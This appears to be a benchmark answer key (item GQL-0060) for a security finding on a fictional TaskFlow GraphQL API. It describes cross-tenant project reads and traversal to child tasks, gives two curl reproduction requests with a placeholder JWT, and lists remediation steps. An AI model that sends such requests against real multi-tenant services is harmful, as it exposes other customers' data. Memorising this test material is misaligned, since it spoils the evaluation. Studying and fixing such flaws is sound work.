# Expected Response

## System
- Domain: SaaS / Project Management
- System: TaskFlow Collaboration API
- Example ID: GQL-0060

## Priority Findings

### Finding 1: Cross-Tenant Project Access + Graph Traversal to Child Tasks (Pattern 5.2)
**Severity:** Critical
**Category:** Injection / BOLA / Graph Traversal

**Summary:**
The `getProject` query returns project `P-2060` belonging to `tenant-38cb` to an attacker from `tenant-f0c1`. Per §5.0: "The GraphQL resolver chain follows nested relationships without re-validating authorization at each level. An attacker can traverse from an authorized project to related child objects across tenant boundaries." Using `getProjectWithChildren`, the attacker can access all child tasks of the cross-tenant project.

**Evidence from HAR:**
- Request: `POST https://api.taskflow-collaborati.example.com/graphql` (2026-04-13T16:22:34Z)
- JWT `x-tenant-id`: `tenant-f0c1`
- Query: `getProject(id: "P-2060") { projectId tenantId ownerId data { sensitiveField internalNotes } }`
- Response `200 OK`; `tenantId: "tenant-38cb"`, `ownerId: "other-user-f0c138cb"`, `sensitiveField: "CONFIDENTIAL-f0c138cb"`, `internalNotes: "Internal data exposed"`
- `x-request-id: req-f0c138cb`

**Root Cause (§4.0 RISK-GQL-060 + §5.0):** `getProject` resolver has no tenant guard; resolver chain does not re-validate at child level.

## Steps to Reproduce

### Step 1 — Cross-tenant project read (HAR)
```bash
curl -s -X POST https://api.taskflow-collaborati.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-f0c1" \
  -d '{"query": "query VulnerableOp { getProject(id: \"P-2060\") { projectId tenantId ownerId data { sensitiveField internalNotes } } }"}'
```
**Vulnerable:** `CONFIDENTIAL-f0c138cb` from `tenant-38cb`. **Secure:** FORBIDDEN.

### Step 2 — Graph traversal to child tasks
```bash
curl -s -X POST https://api.taskflow-collaborati.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-f0c1" \
  -d '{"query": "query { getProjectWithChildren(id: \"P-2060\") { projectId tenantId items { ... on Item { id data } } } }"}'
```
**Vulnerable:** Returns `tenant-38cb` project + all linked task children.

## Remediation
1. Resolver tenant guard on `getProject`/`getProjectWithChildren`: `WHERE project_id=$id AND tenant_id=$jwt.tenantId`.
2. Re-validate tenant at each child resolver level.
3. Per-ID ownership filter in bulk lookups.
4. Redis cache key includes `tenantId`.
